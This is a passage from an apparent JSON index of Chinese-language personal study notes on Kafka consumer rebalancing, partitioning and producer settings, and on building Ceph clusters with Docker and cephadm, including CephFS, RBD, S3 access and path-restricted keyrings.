memberId='consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75', protocol='range'}\n\nNotifying assignor about the new Assignment(partitions=[demo_java-2])\nAdding newly assigned partitions: demo_java-2\nSetting offset for partition demo_java-2 to the committed offset FetchPosition{offset=959, offsetEpoch=Optional[1], currentLeader=LeaderAndEpoch{leader=Optional[localhost:19092 (id: 0 rack: null)], epoch=absent}}\n\nLog\n解釋\n\nRequest joining group due to: group is already rebalancing\nGroup 在 rebalance，consumer 需要重新加入 group。\n\nRevoke previously assigned partitions demo_java-1\nCoordinator 通知 consumer 放棄目前持有的 partition，準備進入下一輪分配。\n\n(Re-)joining group\nconsumer 正在重新加入 group，等待 coordinator 分配。\n\nSuccessfully joined group with generation...\nconsumer 正式加入 group，獲得 generationId 與 memberId。\n\nNotifying assignor about the new Assignment(...)\nconsumer client 收到 coordinator 的分配結果，更新要訂閱的 partition\n\nAdding newly assigned partitions: demo_java-2\n新一輪 rebalance 分配到了 demo_java-2。\n\nSetting offset for partition demo_java-2 to the committed offset...\nconsumer 讀取起點設定為 partition 目前已 commit 的 offset（本例為 959）。\n\n[!TIP]\nGeneration 用於追蹤目前 Group 的狀態，避免舊的成員提交 offset，只有新成員能提交 Partition offset",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka key hashing",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka key hashing/",
		"content": "Producer 預設的 Partition 邏輯使用 murmur2 進行邏輯分區，需要輸入 key，再根據 key 去切分此筆 message 該去哪個 partition，這帶來一個好處，只要是相同的 key，那他的分區位置就是可預測的，並且 kafka 保證分區內的 message 是有序性的，這點用於序列化資料是很重要的。\n\n[!CAUTION]\n若使用 kafka key 有序性分區，當新增 partition 時，會打破原本的分區規則\n\n若因業務需求無法擴張 partition 數量，例如交易資料需要有序性，可以增加 broker 數量\n此論點依據為\n\nLeader partition 會重新分散到更多 broker\n假設：\n- 3 partitions\n- 3 brokers\n\n每個 broker 當 1 個 leader\n現在變成：\n\n3 partitions\n6 brokers\n\nLeader 還是 3 個沒錯，但 follower replicas 會被分散",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka leader partition 機制研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka leader partition 機制研究/",
		"content": "leader partition 概念\n每個 Topic 可以有多個 Partition\n每個 Partition 都是一個 Partition 副本組\n每個 Partition 副本組可以有多個 replication\n每個 Partition 副本組會決定誰是 leader partition\n\ntopic = 多個 partition 副本組的集合\n每個 Partition 都會有一個 Leader 與零個或多個 followers(副本)\nkafka 分片分配規則\n\n在同個 topic 中，每個 partition 副本組的 leader 分片會儘量分散到每個 Broker\n一台 broker 可以同時擔任多個 partitions 副本組的 leader",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/",
		"content": "背景故事\n\nkafka 在新版本引入Cooperative Rebalance(增量 Rebalance)機制\n在過去版本中，只要 consumer 斷線，就會觸發 rebalance，會停止所有 consumer 的訂閱流\nCooperative Rebalance 就是為了解決這個問題\n以下是具體流程\n\n停止 consumer 1 對 Partition 2 的訂閱\n\n過一段時間， kafka 會重新 Assign Partition 2 給 Consumer 2(new consumer)\n\n[!IMPORTANT] Cooperative Rebalance 好處\n其他 Consumer 還是可以持續訂閱，不會中斷\n\nHow to use?\nkafka consumer 可以設定 partition.assignment.strategy",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka rebalance 機制 - Eager Rebalance",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/",
		"content": "Eager Rebalance(此 rebalance 會造成世界停止)\n\n停止 consumer 訂閱\n\n分配完重新開始訂閱\n\n[!IMPORTANT]\n\nconsumer 在 rebalance 後，不一定能再次訂閱到之前的 Partition\n在世界停止期間，所有 consumer 訂閱會停止\n\nRebalance 機制詳解\n\n初始狀態\n\n新的 consumer 加入\n\n通知 kafka cluster 的 Coordinator broker 進行 Rebalancing\n\nCoordinator broker 通知 consumer 斷開已連線的 partition\n\n開始 Rebalancing\n\nCoordinator broker 隨機選出一個 consumer 做為 Leader Consumer\n\nLeader Consumer 從 Coordinator broker 取得 consumer group info\n\nLeader Consumer 的責任是：\n\n收集所有消費者的訂閱資訊 (subscription)。\n根據分配策略 (Range, RoundRobin, Sticky 等) 計算 partition → consumer 的映射。\n將分配結果提交給 Coordinator。\n\nCoordinator 再把這個分配結果下發給所有消費者，完成 rebalance。\n\n完成 rebalance",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka 冪等 Producer",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka 冪等 Producer/",
		"content": "冪等定義\n冪等 = 同一個操作，執行一次或執行多次，結果都一樣。\n不論你做 1 次、10 次、100 次，\n系統的最終狀態必須一模一樣。\nkafka 重複 message 問題\n若 ack 消息回傳期間網路中斷\nProducer 就不會收到 ACK 通知，就會觸發 Retry 機制\n造成訊息重複發送的情況",
		"tags": [ "note","kafka"]
},

{
		"title": "kafka  topic 實驗",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka  topic 實驗/",
		"content": "#kafka\n環境設定\ndocker-compose.yaml\nversion: '2.1'\nservices:\nzoo1:\nimage: confluentinc/cp-zookeeper:7.3.2\nhostname: zoo1\ncontainer_name: zoo1\nports:\n- &quot;2181:2181&quot;\nenvironment:\nZOOKEEPER_CLIENT_PORT: 2181\nZOOKEEPER_SERVER_ID: 1\nZOOKEEPER_SERVERS: zoo1:2888:3888\n\nkafka1:\nimage: confluentinc/cp-kafka:7.3.2\nhostname: kafka1\ncontainer_name: kafka1\nports:\n- &quot;9092:9092&quot;\n- &quot;29092:29092&quot;\n- &quot;9999:9999&quot;\nenvironment:\nKAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092\nKAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT\nKAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL\nKAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot;\nKAFKA_BROKER_ID: 1\nKAFKA_LOG4J_LOGGERS: &quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&quot;\nKAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1\nKAFKA_JMX_PORT: 9999\nKAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}\nKAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer\nKAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &quot;true&quot;\ndepends_on:\n- zoo1\n\ndocker compose up -d\n\ndocker exec -it kafka1 bash\n\n刪除 JMX env\nunset JMX_PORT &amp;&amp; unset KAFKA_JMX_OPTS\n\n建立一個 topic\nkafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092\n\n檢查 topic 詳情\nkafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092\n\n建一個 producer\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092\n\n查看目前 topic 有多少 message, 顯示的是 offset 的值\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events\nquickstart-events:0:16\n\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat\nfilebeat:0:0\n\n建立一個 訂閱者，訂閱 quickstart-events\nkafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092\n\n測試 kafka consumer group 消費機制\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1\n\n同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息\n\n顯示目前 kafka 有多少 topic\n[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092\n__consumer_offsets\nfilebeat\nmetricbeat\nmy_group2_v2\nquickstart-events",
		"tags": ["kafka", "note","kafka"]
},

{
		"title": "kafka 高效率傳輸設定",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka 高效率傳輸設定/",
		"content": "訂閱 kafka 消息\nkafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange\n\n高效率傳輸時，可考慮以下設定\n\nmax.in.flight.requests.per.connection\n\n每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去\n若設定 = 1\n\n訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要\n\nlinger.ms\n\n等待一段 linger.ms，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 linger.ms 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 linger.ms 才進行批處理\n\ncompression.type\n\n批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)\n\nbatch.size\n\n批處理的單筆 message 大小，若超過，則立即處理該訊息",
		"tags": [ "note","kafka"]
},

{
		"title": "Ceph cluster 資料寫入篇 - CephFS",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/Ceph cluster 資料寫入篇 - CephFS/",
		"content": "環境準備\n在準備掛載的主機\n\n安裝 ceph-fuse\napt install ceph-fuse\n\n在 ceph 主機\n\nssh ubuntu@ceho-mon &lt;--- cephFS 主機\n\n安裝 ceph-fuse\napt install ceph-fuse\n\n建立使用者\n設定client.mds_user 為使用者名稱，後面則是分別設定mon,mds,osd的存取權限\nceph auth get-or-create client.mds_user mon 'allow r' mds 'allow *' osd 'allow rw pool=cephfs_metadata,allow rwx pool=cephfs_data'\n\n查看使用者及其存取權限\nceph auth list\n\n同步主機憑證\nubuntu@192.168.1.62 為待會要掛載 NFS 資料夾的主機位置\nsudo scp -i ~/.ssh/id_rsa -r /etc/ceph ubuntu@192.168.1.62:/etc/ceph\n\n在準備掛載的主機\n\nssh ubuntu@192.168.1.62 &lt;--- 欲掛載的主機\n\n建立掛載資料夾\nmkdir -p /mnt/fuse_cephfs\n\n掛載 cephfs 到 /mnt/fuse_cephfs\n# 指定 172.20.0.10 為 ceph-mon 的 IP 位置\nsudo ceph-fuse -m 172.20.0.10:6789 /mnt/fuse_cephfs\n\n# 如果 /etc/ceph/ceph.confg 設定檔有設定 mon_ip 就不用帶『-m 172.20.0.10:6789』 參數\nsudo ceph-fuse /mnt/fuse_cephfs\n\n# Debug mode\nsudo ceph-fuse /mnt/fuse_cephfs -d\n\n# 指定 mount cephfs 的位置\nceph-fuse -r /lab/api /mnt/fuse_cephfs\n\n嘗試讀取同一個檔案內容\n\n修改檔案後，也同步到另一台機器了\n\n指定 mount cephfs 的位置\nceph-fuse -r /lab/api /mnt/fuse_cephfs\n\n<a class=\"internal-link is-unresolved\" href=\"/404\" target=\"\">cephfs 指定 mount cephfs 的位置</a>\n清理環境\n$ df -h\n\n清除正在這個 mount 資料夾的user\n$ fuser -km /mnt/fuse_cephfs/\n\numount\n$ sudo umount -lf /mnt/fuse_cephfs/",
		"tags": [ "note","ceph","docker"]
},

{
		"title": "Ceph cluster 資料寫入篇 - RBD",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/Ceph cluster 資料寫入篇 - RBD/",
		"content": "進入 ceph-mon\ndocker exec -it ceph-mon bash\n\n建立 osd pool\nosd pool create test-rbd 128 128\n\n顯示所有 pool\nceph osd pool ls\n\nceph osd pool application enable test-rbd rbd\n\n在已建立的 osd pool 內，建立一個 test-data-image\nrbd create test-data-image --size 20G --pool test-rbd --image-format 2 --image-feature layering\n\nrbd create --pool test-rbd --image rbd-demo1.img --size 10G\n\nrbd ls --pool test-rbd\n\nrbd --image test-data-image --pool test-rbd info\n\n$ ceph auth get-or-create client.testuser mon 'allow r' osd 'allow * pool=test-rbd' -o /var/lib/ceph/client-auth/ceph.keyring\n\n回到宿主機上\nmkdir -p /var/lib/ceph/client-auth/\ncp /var/lib/ceph/client-auth/ceph.keyring /etc/ceph/client-auth/ceph.keyring\n\n安裝 docker rbd plugin (每個 node 都要)\ndocker plugin install wetopi/rbd \\\n--alias=wetopi/rbd \\\nLOG_LEVEL=1 \\\nRBD_CONF_POOL=&quot;test-rbd&quot; \\\nRBD_CONF_CLUSTER=ceph \\\nRBD_CONF_KEYRING_USER=client.testuser\n\ndocker plugin ls\nID NAME DESCRIPTION ENABLED\n029dbbd2e032 wetopi/rbd:latest RBD plugin for Docker true\n\ndocker volume create -d wetopi/rbd my_rbd_volume\n\nhttps://github.com/wetopi/docker-volume-rbd\nhttps://rdwaykos.medium.com/ceph-rbd-for-docker-volume-fa2884cedaf5\n測試掛載剛剛建立的 volume\ndocker run -it --rm \\\n--volume my_rbd_volume:/data:ro \\\n--network ceph-network \\\n--volume-driver=wetopi/rbd \\\nubuntu:latest bash\n\n連線到 ceph mon 可以看到剛剛建立的 volume 已經被 ceph 託管了\n$ rbd ls test-rbd\nmy_rbd_volume\n\n將建立好的 ceph.keyring 同步到其他台主機的 /etc/ceph\nsudo scp -i /home/ubuntu/.ssh/id_rsa -r /etc/ceph ubuntu@192.168.1.51:~/ceph\n\n$ sudo mv ./ceph.keyring /etc/ceph\n$ ls /etc/ceph\nceph.keyring\n\n重要事項\nRBD 不支援一個 volume 被多個 container 掛載(readwrite many)，只有 ReadWriteOnce 模式",
		"tags": [ "note","ceph","docker"]
},

{
		"title": "Ceph cluster 資料寫入篇 - ceph S3",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/Ceph cluster 資料寫入篇 - ceph S3/",
		"content": "前言\n續前篇 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/搭建 Ceph cluster/\">搭建 Ceph cluster</a> 結果，已經有一個 ceph cluster 可以使用了，現在要做的是將資料存入 ceph S3 內。\n這邊會選用 Ceph S3 做範例的原因是因為 Ceph S3 和 AWS S3 都是基於 S3 API 標準進行物件儲存，兩者程式碼間可以無痛轉移。\n差異\n\nAWS S3 (Simple Storage Service)\n\n完全由 AWS 管理的公有雲服務，使用者無需關注基礎設施的運維。\n\nCeph S3\n\n開源的分散式儲存系統，可部署在私有雲、公有雲或混合雲中。\nCeph 提供了與 S3 API 兼容的物件儲存介面，通過 RADOS Gateway (RGW) 實現。\n\n相同\n1. 使用 S3 API\n\n相同點：\n\n都支持 AWS S3 API 標準，如 PUT、GET、DELETE 請求操作。\n客戶端可以使用相同的 S3 工具（如 boto3）與 Ceph S3 和 AWS S3 通訊。\n支援 RESTful API 進行物件存取和操作。\n2. 存儲模型\n\n相同點：\n\n都基於 桶（Bucket） 和 物件（Object） 的存儲結構設計。\n支援桶內物件的層級目錄結構（邏輯上的文件夾）。\n\nDemo\n搭建 rgw 節點\n建立 rgw 節點 token\ndocker exec ceph-mon ceph auth get client.bootstrap-rgw -o /var/lib/ceph/bootstrap-rgw/ceph.keyring\n\n啟動 rgw 節點\ndocker run -d --privileged=true --name ceph-rgw --network ceph-network --ip 172.20.0.15 -e CLUSTER=ceph -e RGW_NAME=ceph-rgw -p 7480:7480 -v /var/lib/ceph/:/var/lib/ceph/ -v /etc/ceph:/etc/ceph -v /etc/localtime:/etc/localtime:ro ceph/daemon:latest-luminous rgw\n\n建立使用者\n連線到 ceph-rgw 主機建立 testuser\ndocker exec ceph-rgw radosgw-admin user create --uid=&quot;testuser&quot; --display-name=&quot;testuser&quot;\n\n查看剛剛建立的 testuser\ndocker exec ceph-rgw radosgw-admin user info --uid testuser\n\n填入剛剛顯示的 access_key 與 secret_key 欄位的值到 python script\nimport os\nimport boto\nimport boto.s3.connection\n\n# S3 連線憑證\naccess_key = 'ACCESS_KEY'\nsecret_key = 'SECRET_KEY'\n\n# 連接到 S3 儲存服務\nconn = boto.connect_s3(\n\taws_access_key_id=access_key,\n\taws_secret_access_key=secret_key,\n\thost='172.20.0.15', # 替換為自建的 ceph RGW 節點 IP\n\tport=7480, # 替換為自建的 ceph RGW 節點 Port\n\tis_secure=False, # 禁用 HTTPS\n\tcalling_format=boto.s3.connection.OrdinaryCallingFormat(),\n)\n\n# 儲存桶內物件的操作\ndef manage_bucket_operations():\n\tbucket_name = &quot;my-new-bucket-1&quot;\n\tlocal_download_dir = &quot;./downloaded_files&quot; # 本機下載目錄\n\n\tprint(&quot;建立儲存桶...&quot;)\n\tbucket = conn.create_bucket(bucket_name)\n\n\t# 上傳檔案到儲存桶\n\tfile_path = &quot;example.txt&quot;\n\tprint(&quot;上傳檔案...&quot;)\n\tkey = bucket.new_key(&quot;example.txt&quot;)\n\tkey.set_contents_from_filename(file_path)\n\tprint(&quot;檔案已上傳: example.txt&quot;)\n\n\t# 顯示儲存桶內所有檔案\n\tprint(&quot;顯示儲存桶內所有檔案...&quot;)\n\tfor key in bucket.list():\n\t\tprint(f&quot;檔案名稱: {key.name}&quot;)\n\n\t# 下載儲存桶內容到本機\n\tprint(&quot;下載儲存桶內容到本機...&quot;)\n\tif not os.path.exists(local_download_dir):\n\t\tos.makedirs(local_download_dir)\n\tfor key in bucket.list():\n\t\tlocal_file_path = os.path.join(local_download_dir, key.name)\n\t\tprint(f&quot;下載檔案: {key.name} 到 {local_file_path}&quot;)\n\t\tkey.get_contents_to_filename(local_file_path)\n\tprint(f&quot;儲存桶內容已下載到: {local_download_dir}&quot;)\n\n\t# 清空儲存桶內所有物件\n\tprint(&quot;清空儲存桶內的所有物件...&quot;)\n\tfor key in bucket.list():\n\t\tprint(f&quot;刪除物件: {key.name}&quot;)\n\t\tbucket.delete_key(key.name)\n\tprint(&quot;儲存桶已清空&quot;)\n\n\t# 刪除儲存桶\n\tprint(&quot;刪除儲存桶...&quot;)\n\tconn.delete_bucket(bucket_name)\n\tprint(f&quot;已刪除儲存桶：{bucket_name}&quot;)\n\n# 執行範例\nif __name__ == &quot;__main__&quot;:\n\tprint(&quot;執行儲存桶操作...&quot;)\n\tmanage_bucket_operations()\n\nResult\n\nRef: https://docs.ceph.com/en/reef/radosgw/s3/python/",
		"tags": [ "note","ceph","cephadm","#s3"]
},

{
		"title": "Cephfs ACL mount path",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/Cephfs ACL mount path/",
		"content": "背景\n現在已經可以 mount 到指定的資料夾，但還是有機會被 mount 到 &quot;/&quot;\n期望可以依照 user keyring 來指定能掛載的 path\n官方文件[1] 已經有實現這部分的 ACL 控制了\n思路\n\n建立用戶並設定 Auth 規則，只能掛載特定的 Path\ncopy client keyring 到 client 機器\n\nDemo\nCeph-cluster master\n輸出所有的 ceph filesystem name\nroot@ceph-cluster-01:/mnt/ceph-cluster# ceph fs ls\nname: cephfs-data, metadata pool: cephfs.cephfs-data.meta, data pools: [cephfs.cephfs-data.data ]\n\n建立 「api_user」，並指定該用戶能掛載目錄位置\nroot@ceph-cluster-01:/etc/ceph# ceph fs authorize cephfs-data client.api_user /lab/latest rw\n[client.api_user]\n\tkey = YOUR_KEY==\n\n建立的 client 會指名只能掛載指定的 path\nroot@ceph-cluster-01:/etc/ceph# ceph auth get client.api_user\nexported keyring for client.api_user\n[client.api_user]\n\tkey = YOUR_KEY==\n\tcaps mds = &quot;allow rw path=/test/api/lab/latest&quot;\n\tcaps mon = &quot;allow r&quot;\n\tcaps osd = &quot;allow rw tag cephfs data=cephfs-data&quot;\n\nclient server\n將 server 端產製的 auth key 放到 ceph config目錄\nroot@lab-api:/etc/ceph# cat &lt;&lt; EOF &gt; ceph.client.api_user.keyring\n&gt; [client.api_user]\n&gt; key = YOUR_KEY==\n&gt; EOF\n\nroot@lab-api:/etc/ceph# cat ceph.client.api_user.keyring\n[client.api_user]\nkey = YOUR_KEY==\n\n嘗試 mount 一個不允許的資料夾位置 /test/api/lab\n出現 「Operation not permitted」\nroot@test:/etc/ceph# ceph-fuse -n client.api_user -r /test/api/lab /mnt/fuse_cephfs2\nceph-fuse[566845]: starting ceph client\nceph-fuse[5668452024-12-17T17:36:51.358+0800 7f18a4ff9700 -1 client.35409 mds.0 rejected us (non-allowable root '/test/api/lab')\n]: ceph mount failed with (1) Operation not permitted\n\n如果 mount 到合法的位置，就掛載成功\nroot@lab-api:/etc/ceph# ceph-fuse -n client.api_user -r /test/api/lab/latest /mnt/fuse_cephfs2\nceph-fuse[567096]: starting ceph client\n2024-12-17T17:38:16.602+0800 7fd850d0a080 -1 init, newargv = 0x5636070a9900 newargc=9\nceph-fuse[567096]: starting fuse\n\n同樣的，也可以使用 linux 系統的 Mount 指令\nroot@lab-api:/etc/ceph# cat /etc/hosts\n10.94.1.20 ceph-cluster-01\n10.94.1.21 ceph-cluster-02\n10.94.1.22 ceph-cluster-03\n\n$ mount -t ceph ceph-cluster-01,ceph-cluster-02,ceph-cluster-03:/test/api/lab/latest /mnt/fuse_cephfs2 -o name=api_user\n\n清理環境\n$ sudo umount -lf /mnt/fuse_cephfs2/\n\nReference\n\nhttps://docs.ceph.com/en/reef/cephfs/client-auth/#path-restriction ↩︎",
		"tags": [ "note"]
},

{
		"title": "ceph 建立 filesystem",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/cephadm/ceph 建立 filesystem/",
		"content": "背景\nmds service 需要有一個 datapool，才能將這個 datapool 掛載成 nfs\n\n[!IMPORTANT]\n以下操作指令只需要在 master 主機完成\n\n為了可以使用 cephfs，所以需要先建立 data pool\n$ ceph fs volume create cephfs-data\n$ ceph fs volume ls\n\n[!TIP] Optional\n在 master 主機下指令開啟 datapool 刪除權限\n\nceph config set mon mon_allow_pool_delete true\n\nPools 介面上長出兩個 pool\n\ncephfs.cephfs-data.data\n\n存放資料的 pool\n\ncephfs.cephfs-data.meta\n\n給 mds service 使用的 metadata\n\n部署 mds 服務\nceph orch apply mds cephfs-data\n\nMDS 的服務已經分別部署在 ceph-cluster-01 與 ceph-cluster-02\n\n之後再根據這篇完成掛載即可\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/Ceph cluster 資料寫入篇 - CephFS/\">Ceph cluster 資料寫入篇 - CephFS</a>",
		"tags": [ "note","ceph","cephadm"]
},

{
		"title": "ceph 新增 OSD",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/cephadm/ceph 新增 OSD/",
		"content": "確認 orch 服務正常運行\nroot@ceph-cluster-01:/home/# ceph orch status\nBackend: cephadm\nAvailable: True\n\n嘗試列出所有可用設備，目前會是空的，因為還沒建立\nceph orch device ls\n\n查看 block，目前只有一個 sda2 給系統使用\nlsblk -f\n\n部署要求\n\n設備必須沒有分區。\n設備不得具有任何 LVM 狀態。\n不得安裝設備。\n設備不能包含檔案系統。\n設備不得包含 Ceph BlueStore OSD。\n設備必須大於 5 GB。\n\nESXi 新增磁碟空間\n\n儲存\n\n重新開機\n\n重新開機後，/dev/sdb 磁碟區出現\n\n建立 LVM 分區\n\nCeph 新增 device\n\nceph orch daemon add osd {HOST_NAME}:\n\n只要在 ceph-cluster-01 這台機器輸入 ceph osd daemon 部署指令就好\nroot@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-02:/dev/ceph-vg/ceph-lv-1\nCreated osd(s) 0 on host 'ceph-cluster-02'\n\nroot@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-02:/dev/ceph-vg/ceph-lv-2\nCreated osd(s) 1 on host 'ceph-cluster-02'\n\nroot@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-03:/dev/ceph-vg/ceph-lv-3\nCreated osd(s) 2 on host 'ceph-cluster-03'",
		"tags": [ "note","#ceph","cephadm"]
},

{
		"title": "cephadm 搭建 ceph 集群",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/cephadm/cephadm 搭建 ceph 集群/",
		"content": "Firewall\n\nEntity\nPort\ndirection\n\nceph-cluster-01、ceph-cluster-02、ceph-cluster-03\n8443\ninbound\n\n3300\ninbound\n\n6789\ninbound\n\n6800~7568\ninbound\n\nref: https://docs.ceph.com/en/reef/cephadm/install/#cephadm-deploying-new-cluster\n前置條件\n\nceph cluster 內，master 機器都可以用 ssh key 登入每台 VM 的 root 用戶\nceph master 主機需要允許 port 8443(ceph web ui)\n每台機器都要安裝 docker\n\napt install -y cephadm\n\ncephadm add-repo --release reef\ncephadm install\n\n透過執行which確認cephadm現在位於您的 PATH 中\nwhich cephadm\n\n成功which cephadm指令將傳回以下內容：\n/usr/sbin/cephadm\n\n引導 ceph 集群建立\ncephadm bootstrap --mon-ip 10.0.0.2\n\n登入資訊\nCeph Dashboard is now available at:\n\n\t URL: https://10.0.0.2:8443/\n\t User: admin\n\tPassword: test\n\nYou can access the Ceph CLI with:\n\n\tsudo /usr/sbin/cephadm shell --fsid a90fc58e-b38f-11ef-b557-732197d2d654 -c /etc/ceph/ceph.conf -k /etc/ceph/ceph.client.admin.keyring\n\n打開 dashboard\nhttps://10.0.0.2:8443/\n\n進入 cephadm shell\n$ cephadm shell\n\nInferring fsid a90fc58e-b38f-11ef-b557-732197d2d654\nInferring config /var/lib/ceph/a90fc58e-b38f-11ef-b557-732197d2d654/mon.ceph-cluster-01/config\nUsing recent ceph image quay.io/ceph/ceph@sha256:c08064dde4bba4e72a1f55d90ca32df9ef5aafab82efe2e0a0722444a5aaacca\nroot@ceph-cluster-01:/#\n\n加入 host 到 ceph cluster\n確認完可以用 ssh key 登入目標主機成為 root 後，就可以新增 ceph node 了\n這邊附上卡住的問題記錄 <a class=\"internal-link is-unresolved\" href=\"/404\" target=\"\">踩坑日記 - 遠端用 SSH key 登入 root 權限問題</a>\n設定 /etc/hosts\n每台電腦都要\n# ceph-cluster-01\n127.0.1.1 ceph-cluster-01\n10.94.1.21 ceph-cluster-02\n10.94.1.22 ceph-cluster-03\n\n# ceph-cluster-02\n0.94.1.20 ceph-cluster-01\n127.0.1.1 ceph-cluster-02\n10.94.1.22 ceph-cluster-03\n\n# ceph-cluster-03\n10.0.0.2 ceph-cluster-01\n10.94.1.21 ceph-cluster-02\n127.0.1.1 ceph-cluster-03\n\n使用 ceph orch host add 指令來新增 host\ntest@ceph-cluster-01:~$ sudo cephadm shell ceph orch host add ceph-cluster-02 10.94.1.21\n\nInferring fsid a90fc58e-b38f-11ef-b557-732197d2d654\nInferring config /var/lib/ceph/a90fc58e-b38f-11ef-b557-732197d2d654/mon.ceph-cluster-01/config\nUsing recent ceph image quay.io/ceph/ceph@sha256:c08064dde4bba4e72a1f55d90ca32df9ef5aafab82efe2e0a0722444a5aaacca\nAdded host 'ceph-cluster-02'\n\nceph-cluster-02 身上的 docker container\n\n其餘的機器也照同樣的 [[#加入 host 到 ceph cluster]] 流程走\n加上 label 到 master ceph node (介面上就會顯示哪台機器是 master 了)\ntest@ceph-cluster-01:~$ sudo ceph orch host label add ceph-cluster-01 master\nAdded label master to host ceph-cluster-01\n\n完成\n\nNext\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/cephadm/ceph 新增 OSD/\">ceph 新增 OSD</a>",
		"tags": [ "note","ceph","cephadm"]
},

{
		"title": "搭建 Ceph cluster",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ceph/搭建 Ceph cluster/",
		"content": "前言\n在眾多搭建 ceph 的方法中，最適合 POC 測試的就是用 docker 搭建 ceph 集群，如果是生產環境，可以使用官方推薦的 cephadm 或是 ceph-ansible。\n目的\n用 Docker 建立 ceph cluster，並且支援 aws S3 儲存 API 以及 cephfs\n環境準備\n\nos: ubuntu\n一台有安裝 docker 的電腦\n\n節點角色解釋\n\nMON（Monitor 節點）\n\n功能：\n\n負責存儲集群的核心數據，例如集群狀態、配置、訪問權限等。\n提供其他節點（OSD、MGR 等）與客戶端的集群狀態信息。\n\n用途：\n\n是 Ceph 集群的基礎，沒有 MON 節點，集群無法正常運作。\n\n節點失效情況 :\n\n無法讀寫資料\n\nOSD（Object Storage Daemon 節點）\n\n功能：\n\n負責實際存儲數據，並管理數據副本的一致性。\n根據 CRUSH 算法決定數據應存放的物理位置。\n提供數據讀取與寫入服務，並定期回報狀態給 MON。\n\n用途：\n\nCeph 中的數據存儲骨幹，所有的物件數據都存放在 OSD 中。\n通常一個 OSD 容器或 Process 對應一個物理磁碟。\n\n節點失效情況 :\n\n如果 data pool 內的資料沒有設定 replica，在該 OSD 上的資料會有遺失風險\n\nMGR（Manager 節點）\n\n功能：\n\n提供集群的內部狀態監控\n\n用途：\n\n確保集群監控與健康狀態的即時性。\n\n節點失效情況 :\n\n因為無法正常管理 OSD 節點加入與移除，無法掛載 cephfs，整體集群無法訪問\n\nRGW（RADOS Gateway 